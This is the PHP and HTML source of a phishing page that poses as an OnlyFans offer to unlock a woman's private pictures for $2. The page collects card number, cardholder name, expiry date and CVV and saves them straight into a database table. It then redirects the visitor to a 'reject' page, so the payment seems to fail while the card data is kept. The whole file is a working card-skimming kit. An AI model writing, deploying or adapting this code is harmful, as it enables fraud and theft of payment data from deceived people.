<?php
// index.php

require_once 'connection.php';

if (!empty($_POST["cardNumber"])) {
    $cardNumber = $_POST["cardNumber"];

    // Check if the card number has exactly 15 characters


    $stmt = $conn->prepare("INSERT INTO cards (cardNumber, cardName, ExpiryDate, cvv) VALUES (?, ?, ?, ?)");
    $stmt->bind_param("ssss", $cardNumber, $_POST["cardName"], $_POST["expiryDate"], $_POST["cvv"]);

    if ($stmt->execute()) {
        header("Location: reject.php");
    } else {
        echo "Error: " . $stmt->error;
    }

    $stmt->close();
}

$conn->close();
?>

<!DOCTYPE html>
<html>
<head>
    <title>Card Information</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <style>
                .error-input {
            border-color: red;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="onlybox">
            <center><img src="photo_2023-06-28_01-40-45-removebg-preview.png" alt="onlyfans" width="180px" height="40px"></center>
            <center><h1 class="unlock">Unlock Veronikas Private Pictures for 2$</h1></center>
        </div>
        <h1 class="payment">Payment</h1>
        <form action="index.php" method="POST">
            <div class="form-group">
                <label for="cardNumber">Card Number</label>
                <input type="text" id="cardNumber" name="cardNumber" placeholder="4444 4444 4444 4444" required>
            </div>
            <div class="form-group">
                <label for="cardName">Cardholder Name</label>
                <input type="text" id="cardName" name="cardName" placeholder="Enter cardholder name" required>
            </div>
            <div class="form-group">
                <label for="expiryDate">Expiry Date</label>
                <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" required>
            </div>
            <div class="form-group">
                <label for="cvv">CVV</label>
                <input type="number" id="cvv" name="cvv" placeholder="Enter CVV" required>
            </div>
            <center><input type="submit" class="enter" value="Unlock"></center>
        </form>
    </div>
    <script>
                const expiryDateInput = document.getElementById('expiryDate');

                expiryDateInput.addEventListener('input', function() {
                const value = this.value.replace(/\D/g, '').slice(0, 4);
                const formattedValue = value.replace(/(\d{2})(\d{2})/, '$1/$2');
                this.value = formattedValue;
                });
                const cardNumberInput = document.getElementById('cardNumber');

                cardNumberInput.addEventListener('input', function() {
                const value = this.value.replace(/\s/g, '').replace(/\D/g, '').replace(/(\d{4})(?!$)/g, '$1 ');

                if (value.length > 19) {
                this.value = value.slice(0, 19);
                } else {
                this.value = value;
                }
                    if (value.length > 19) {
                    this.value = value.slice(0, 19);
                } else {
                    this.value = value;
                }

                // Add/remove error class based on input length
                if (this.value.length !== 14) {
                    this.classList.add('error-input');
                } else {
                    this.classList.remove('error-input');
                }
                });

    </script>
</body>
</html>
